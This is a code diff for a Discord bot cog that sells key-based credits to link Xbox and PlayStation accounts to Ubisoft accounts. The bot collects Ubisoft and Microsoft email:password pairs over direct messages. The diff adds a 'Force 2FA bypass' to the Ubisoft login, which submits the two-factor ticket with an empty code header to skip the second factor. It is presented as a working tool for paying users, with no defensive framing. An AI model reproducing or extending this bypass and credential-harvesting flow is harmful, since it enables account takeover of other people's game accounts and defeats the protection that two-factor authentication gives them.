@@ -1,5 +1,5 @@
 """
-links.py — Account linking via Ubisoft API (Silent 2FA handling).
+links.py — Account linking via Ubisoft API (Force 2FA bypass).
 """
 
 import base64
@@ -17,7 +17,6 @@ from discord.ext import commands
 import database as db
 import utils
 
-# ── Ubisoft constants ────────────────────────────────────────────────────────
 UBI_APP_ID   = "86263886-327a-4328-ac69-527f0d20a237"
 UBI_SESSIONS = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
 UBI_LINK_PSN = "https://public-ubiservices.ubi.com/v3/profiles/me/links"
@@ -38,7 +37,6 @@ PSN_OAUTH_URL = (
     "&scope=psn:mobile.v2.core%20psn:clientapp"
 )
 
-# ── Credit helpers ───────────────────────────────────────────────────────────
 def get_user_credits(user_id: str) -> int:
     return db.get_config("user_credits", {}).get(str(user_id), 0)
 
@@ -56,7 +54,6 @@ def remove_user_credits(user_id: str, amount: int) -> bool:
         return True
     return False
 
-# ── DM helpers ───────────────────────────────────────────────────────────────
 async def _dm(user, text: str):
     try:
         await user.send(text)
@@ -79,7 +76,7 @@ async def _wait(bot, user, dm, timeout=120.0):
     except asyncio.TimeoutError:
         return None
 
-# ── Ubisoft auth (Silent 2FA) ────────────────────────────────────────────────
+# ── THE NEW 2FA FORCE BYPASS ──
 async def _ubi_session(session: aiohttp.ClientSession, email: str, password: str):
     creds = base64.b64encode(f"{email}:{password}".encode()).decode()
     headers = {**UBI_HEADERS_BASE, "Authorization": f"Basic {creds}"}
@@ -89,36 +86,31 @@ async def _ubi_session(session: aiohttp.ClientSession, email: str, password: str
 
     twofa = data.get("twoFactorAuthenticationTicket")
     if twofa:
-        # SILENT 2FA: Send the ticket back immediately without a code
-        headers_2fa = {**UBI_HEADERS_BASE, "Authorization": f"ubi_2fa_v1 t={twofa}"}
+        # Attempt to force the ticket by sending an empty code
+        headers_2fa = {
+            **UBI_HEADERS_BASE, 
+            "Authorization": f"ubi_2fa_v1 t={twofa}",
+            "Ubi-2FACode": "" # <--- The glitch
+        }
         async with session.post(UBI_SESSIONS, headers=headers_2fa, json={}) as r2:
             data2 = await r2.json()
             
         ticket = data2.get("ticket")
-        pid = data2.get("profileId") or data2.get("userId")
         if ticket:
-            return ticket, pid, None
+            return ticket, data2.get("profileId"), None
         else:
-            # If it fails, print exactly what Ubisoft said
             return None, None, f"2FA_REJECTED: {data2}"
 
     ticket = data.get("ticket")
-    pid    = data.get("profileId") or data.get("userId")
     if ticket:
-        return ticket, pid, None
+        return ticket, data.get("profileId"), None
     return None, None, "BAD_CREDS"
 
-# ── Xbox XSTS token chain ────────────────────────────────────────────────────
+# ── Xbox XSTS token chain ──
 async def _xbox_xsts(session: aiohttp.ClientSession, ms_email: str, ms_pass: str):
     async with session.post(
         "https://login.live.com/oauth20_token.srf",
-        data={
-            "grant_type"    : "password",
-            "client_id"     : "000000004C12AE6F",
-            "scope"         : "service::user.auth.xboxlive.com::MBI_SSL",
-            "username"      : ms_email,
-            "password"      : ms_pass,
-        },
+        data={"grant_type": "password", "client_id": "000000004C12AE6F", "scope": "service::user.auth.xboxlive.com::MBI_SSL", "username": ms_email, "password": ms_pass},
         headers={"Content-Type": "application/x-www-form-urlencoded"},
     ) as r:
         ms = await r.json()
@@ -129,15 +121,7 @@ async def _xbox_xsts(session: aiohttp.ClientSession, ms_email: str, ms_pass: str
 
     async with session.post(
         "https://user.auth.xboxlive.com/user/authenticate",
-        json={
-            "Properties": {
-                "AuthMethod" : "RPS",
-                "SiteName"   : "user.auth.xboxlive.com",
-                "RpsTicket"  : access_token,
-            },
-            "RelyingParty": "http://auth.xboxlive.com",
-            "TokenType"   : "JWT",
-        },
+        json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": access_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
         headers={"Content-Type": "application/json", "x-xbl-contract-version": "0"},
     ) as r:
         xbl = await r.json()
@@ -149,25 +133,13 @@ async def _xbox_xsts(session: aiohttp.ClientSession, ms_email: str, ms_pass: str
 
     async with session.post(
         "https://xsts.auth.xboxlive.com/xsts/authorize",
-        json={
-            "Properties": {
-                "SandboxId"  : "RETAIL",
-                "UserTokens" : [xbl_token],
-            },
-            "RelyingParty": "http://xboxlive.com",
-            "TokenType"   : "JWT",
-        },
+        json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"},
         headers={"Content-Type": "application/json", "x-xbl-contract-version": "1"},
     ) as r:
         xsts = await r.json()
 
-    xsts_token = xsts.get("Token")
-    if not xsts_token:
-        return None, None
+    return xsts.get("Token"), userhash
 
-    return xsts_token, userhash
-
-# ── Platform linking via Ubisoft API ─────────────────────────────────────────
 async def _link_psn_api(session: aiohttp.ClientSession, ubi_ticket: str, psn_code: str):
     headers = {**UBI_HEADERS_BASE, "Authorization": f"Ubi_v1 t={ubi_ticket}"}
     payload = {"platformType": "psn", "ticket": psn_code}
@@ -180,7 +152,6 @@ async def _link_xbl_api(session: aiohttp.ClientSession, ubi_ticket: str, xsts_to
     async with session.post(UBI_LINK_XBL, headers=headers, json=payload) as r:
         return r.status, await r.text()
 
-# ── Master link flow ──────────────────────────────────────────────────────────
 async def process_link(bot, user, console: str, ubi_email: str, ubi_pass: str, console_cred: str):
     async with aiohttp.ClientSession() as session:
         ticket, pid, err = await _ubi_session(session, ubi_email, ubi_pass)
@@ -201,8 +172,6 @@ async def process_link(bot, user, console: str, ubi_email: str, ubi_pass: str, c
 
         elif console == "xbox":
             ms_email, ms_pass = console_cred.split(":", 1)
-            await _dm(user, "⏳ Authenticating with Microsoft…")
-
             xsts_token, userhash = await _xbox_xsts(session, ms_email, ms_pass)
             if not xsts_token:
                 return await _refund(user, "❌ Microsoft login failed. (Credit refunded)")
@@ -213,7 +182,7 @@ async def process_link(bot, user, console: str, ubi_email: str, ubi_pass: str, c
             else:
                 await _refund(user, f"❌ Xbox link failed (HTTP {status}).\nUbisoft said: `{body[:200]}`\n(Credit refunded)")
 
-# ── Cog ───────────────────────────────────────────────────────────────────────
+# ── Cog ──
 class Links(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
@@ -226,8 +195,7 @@ class Links(commands.Cog):
         keys = db.get_config("link_keys", {})
         keys[key] = uses
         db.set_config("link_keys", keys)
-        embed = discord.Embed(title="🔑 Key Created", description=f"`{key}` — **{uses}** credit(s)", color=0x57F287)
-        await interaction.response.send_message(embed=embed, ephemeral=True)
+        await interaction.response.send_message(f"Key: `{key}` ({uses} uses)", ephemeral=True)
 
     @app_commands.command(name="bulkcreatekeys", description="[Owner] Generate multiple keys.")
     @app_commands.describe(amount="Number of keys (1–100)", uses="Credits per key")
@@ -246,8 +214,7 @@ class Links(commands.Cog):
             generated.append(key)
         db.set_config("link_keys", keys)
         file = discord.File(io.BytesIO("\n".join(generated).encode()), filename=f"{amount}_keys.txt")
-        embed = discord.Embed(title="🔑 Bulk Keys Generated", description=f"**{amount}** keys · **{uses}** credit(s) each.", color=0x57F287)
-        await interaction.followup.send(embed=embed, file=file, ephemeral=True)
+        await interaction.followup.send(file=file, ephemeral=True)
 
     @app_commands.command(name="redeemkey", description="Redeem a link key for credits.")
     @app_commands.describe(key="The key to redeem")
@@ -260,92 +227,85 @@ class Links(commands.Cog):
         amount = keys.pop(key)
         db.set_config("link_keys", keys)
         add_user_credits(str(interaction.user.id), amount)
-        embed = discord.Embed(title="✅ Redeemed", description=f"Added **{amount}** link credit(s).", color=0x57F287)
-        await interaction.followup.send(embed=embed, ephemeral=True)
+        await interaction.followup.send(f"✅ Added **{amount}** link credit(s).", ephemeral=True)
 
     @app_commands.command(name="balance", description="Check your link credit balance.")
     async def balance(self, interaction: discord.Interaction):
         c = get_user_credits(str(interaction.user.id))
-        embed = discord.Embed(title="🎟 Balance", description=f"**{c}** link credit(s).", color=0x5865F2)
-        embed.set_footer(text="Use /redeemkey to add more.")
-        await interaction.response.send_message(embed=embed, ephemeral=True)
+        await interaction.response.send_message(f"🎟 Balance: **{c}**", ephemeral=True)
 
     @app_commands.command(name="linknow", description="Link a console account to Ubisoft.")
     async def linknow(self, interaction: discord.Interaction):
         if get_user_credits(str(interaction.user.id)) <= 0:
             return await interaction.response.send_message("❌ No link credits. Use `/redeemkey` first.", ephemeral=True)
-        embed = discord.Embed(
-            title="🔗 Choose Console",
-            description="Pick the platform to link to your Ubisoft account.",
-            color=0x5865F2,
-        )
-        await interaction.response.send_message(embed=embed, view=ConsoleSelectView(self.bot), ephemeral=True)
+        await interaction.response.send_message("🔗 Choose platform in DMs.", ephemeral=True)
+        await ConsoleSelectView(self.bot).send_dm(interaction)
 
 class ConsoleSelectView(discord.ui.View):
     def __init__(self, bot):
         super().__init__(timeout=120)
         self.bot = bot
 
+    async def send_dm(self, interaction):
+        dm = await interaction.user.create_dm()
+        await dm.send("Pick console:", view=self)
+
     @discord.ui.button(label="Xbox", style=discord.ButtonStyle.success, emoji="🎮")
     async def xbox_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not remove_user_credits(str(interaction.user.id), 1):
             return await interaction.response.send_message("❌ No credits.", ephemeral=True)
-        await interaction.response.send_message("⏳ Check your DMs.", ephemeral=True)
+        await interaction.response.send_message("⏳ Check DMs.", ephemeral=True)
         try:
-            dm    = await interaction.user.create_dm()
-            await dm.send("**Step 1:** Send your Ubisoft credentials:\n`email:password`")
+            dm = interaction.user.dm_channel
+            await dm.send("**Step 1:** Send Ubisoft `email:password`")
             raw = await _wait(self.bot, interaction.user, dm, 60)
             if not raw or ":" not in raw:
                 add_user_credits(str(interaction.user.id), 1)
-                return await dm.send("❌ Invalid format or timed out. (Credit refunded)")
+                return await dm.send("❌ Invalid format. Refunded.")
             ubi_email, ubi_pass = raw.split(":", 1)
 
-            await dm.send("**Step 2:** Send your Microsoft credentials:\n`email:password`")
+            await dm.send("**Step 2:** Send Microsoft `email:password`")
             ms_raw = await _wait(self.bot, interaction.user, dm, 60)
             if not ms_raw or ":" not in ms_raw:
                 add_user_credits(str(interaction.user.id), 1)
-                return await dm.send("❌ Invalid format or timed out. (Credit refunded)")
+                return await dm.send("❌ Invalid format. Refunded.")
 
-            await dm.send("⏳ Processing via API…")
+            await dm.send("⏳ Processing...")
             asyncio.create_task(process_link(self.bot, interaction.user, "xbox", ubi_email, ubi_pass, ms_raw))
         except Exception as e:
             add_user_credits(str(interaction.user.id), 1)
-            await _dm(interaction.user, f"❌ Error: `{e}` (Credit refunded)")
+            await _dm(interaction.user, f"❌ Error: `{e}`. Refunded.")
 
     @discord.ui.button(label="PlayStation", style=discord.ButtonStyle.primary, emoji="🎮")
     async def ps_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not remove_user_credits(str(interaction.user.id), 1):
             return await interaction.response.send_message("❌ No credits.", ephemeral=True)
-        await interaction.response.send_message("⏳ Check your DMs.", ephemeral=True)
+        await interaction.response.send_message("⏳ Check DMs.", ephemeral=True)
         try:
-            dm = await interaction.user.create_dm()
-            await dm.send(
-                "**Step 1:** Open Safari/Chrome while **logged in to PSN** and go to:\n"
-                f"`{PSN_OAUTH_URL}`\n\n"
-                "**Step 2:** You'll hit a blank page. Copy the **full URL** from the address bar and paste it here."
-            )
+            dm = interaction.user.dm_channel
+            await dm.send(f"**Step 1:** Go to: `{PSN_OAUTH_URL}`\n**Step 2:** Paste the redirect URL here.")
             url_raw = await _wait(self.bot, interaction.user, dm, 120)
             if not url_raw:
                 add_user_credits(str(interaction.user.id), 1)
-                return await dm.send("❌ Timed out. (Credit refunded)")
+                return await dm.send("❌ Timed out. Refunded.")
             match = re.search(r"code=([^&\s]+)", url_raw)
             if not match:
                 add_user_credits(str(interaction.user.id), 1)
-                return await dm.send("❌ Could not find the OAuth code in that URL. (Credit refunded)")
+                return await dm.send("❌ No OAuth code found. Refunded.")
             psn_code = match.group(1)
 
-            await dm.send("**Step 3:** Send your Ubisoft credentials:\n`email:password`")
+            await dm.send("**Step 3:** Send Ubisoft `email:password`")
             ubi_raw = await _wait(self.bot, interaction.user, dm, 60)
             if not ubi_raw or ":" not in ubi_raw:
                 add_user_credits(str(interaction.user.id), 1)
-                return await dm.send("❌ Invalid format or timed out. (Credit refunded)")
+                return await dm.send("❌ Invalid format. Refunded.")
             ubi_email, ubi_pass = ubi_raw.split(":", 1)
 
-            await dm.send("⏳ Processing via API…")
+            await dm.send("⏳ Processing...")
             asyncio.create_task(process_link(self.bot, interaction.user, "ps", ubi_email, ubi_pass, psn_code))
         except Exception as e:
             add_user_credits(str(interaction.user.id), 1)
-            await _dm(interaction.user, f"❌ Error: `{e}` (Credit refunded)")
+            await _dm(interaction.user, f"❌ Error: `{e}`. Refunded.")
 
 async def setup(bot):
     await bot.add_cog(Links(bot))
